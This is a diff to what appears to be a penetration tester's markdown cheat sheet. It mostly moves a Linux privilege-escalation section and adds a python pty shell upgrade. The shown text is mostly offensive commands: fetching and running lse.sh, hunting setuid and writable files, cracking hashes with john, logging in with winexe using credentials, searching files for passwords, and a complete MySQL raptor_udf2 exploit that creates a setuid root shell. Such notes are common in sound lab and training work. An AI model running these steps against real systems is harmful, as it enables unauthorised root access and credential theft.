@@ -990,68 +990,9 @@ kpcli --kdb=Database.kdbx
 /home/user/.ssh/id_rsa
 ```
 
-### Linux enumeration: search for backup files
-```bash
-# search for / (root), /tmp, /var/backups
-```
 
-### Linux Enumeration: automated with lse.sh
-```bash
-wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
-chmod +x lse.sh
-./lse.sh -l 1 -i
-```
 
-### Linux Privesc service enum
-```bash
-# show all processes running as root
-ps aux | grep "^root"
-dpkg -l | grep <program>
-```
 
-### Linux Privesc Setuid Binaries and Capabilities
-```bash
-$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 
-2> /dev/null
-
-/usr/sbin/getcap -r / 2>/dev/null
-```
-
-### Linux Privesc find writable and executable ###
-```bash
-find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
-```
-
-### Linux Privesc find all writable files in /etc/
-```bash
-$ find /etc -maxdepth 1 -writable -type f
-```
-
-### Find all readable files in /etc:
-```bash
-$ find /etc -maxdepth 1 -readable -type f
-```
-
-### Find all directories which can be written to: 
-```bash
-$ find / -executable -writable -type d 2> /dev/null
-```
-
-### gcc for mysql exploit (example): This is possbile when root's password is set to ''
-```bash
-# Add -fPIC when compiling for x64 system
-gcc -g -c raptor_udf2.c -fPIC
-gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-mysql -u root -p
-use mysql;
-create table foo(line blob);
-insert into foo values(load_file('/home/user/raptor_udf2.so'));
-select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
-create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('cp /bin/bash /tmp/rootbash'; chmod +s /tmp/rootbash');
-exit
-/tmp/rootbash -p
-```
 
 ### ssh Port Forwarding
 ```bash
@@ -1063,17 +1004,10 @@ mysql -u root -h 127.0.0.1 -P 4444
 select @@hostname;
 ```
 
-### linux change to root user
-```bash
-su
-sudo su
-```
-
 ### Password cracking with john
 ```bash
 john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
-
 
 ### Verify permissions on each file
 ```bash
@@ -1093,9 +1027,6 @@ mkdir /root/webdav
 locate wsgidav
 /usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
 ```
-
-
-
 
 ### Privesc: Umbraco 7.12.4 exploit
 ```bash
@@ -1315,7 +1246,7 @@ winexe -U 'admin%password123' //192.168.1.22 cmd.exe
 # Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
 > findstr /si password *.xml *.ini *.txt
 
-### With winPEAS
+## With winPEAS
 # Use winPEAS to search for common files which may contain credentials:
 > .\winPEASany.exe quiet cmd searchfast filesinfo
 # The Unattend.xml file was found. View the contents:
@@ -1375,8 +1306,78 @@ oLink.Save
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 
+## Linux Privesc
 
+### Linux enumeration: search for backup files
+```bash
+# search for / (root), /tmp, /var/backups
+```
 
+### Linux Enumeration: automated with lse.sh
+```bash
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
+chmod +x lse.sh
+./lse.sh -l 1 -i
+```
 
+### Linux Privesc service enum
+```bash
+# show all processes running as root
+ps aux | grep "^root"
+dpkg -l | grep <program>
+```
 
+### Upgrade bash with python
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
+### Linux Switch to root
+```bash
+su
+sudo su
+```
+
+### Linux exploit: Service exploit - gcc for mysql exploit (example): This is possbile when root's password is set to ''
+```bash
+# Add -fPIC when compiling for x64 system
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/rootbash'; chmod +s /tmp/rootbash');
+exit
+/tmp/rootbash -p
+```
+
+### Linux Privesc Setuid Binaries and Capabilities
+```bash
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 
+2> /dev/null
+
+/usr/sbin/getcap -r / 2>/dev/null
+```
+
+### Linux Privesc find writable and executable ###
+```bash
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
+
+### Linux Privesc find all writable files in /etc/
+```bash
+$ find /etc -maxdepth 1 -writable -type f
+```
+
+### Find all readable files in /etc:
+```bash
+$ find /etc -maxdepth 1 -readable -type f
+```
+
+### Find all directories which can be written to: 
+```bash
+$ find / -executable -writable -type d 2> /dev/null
+```
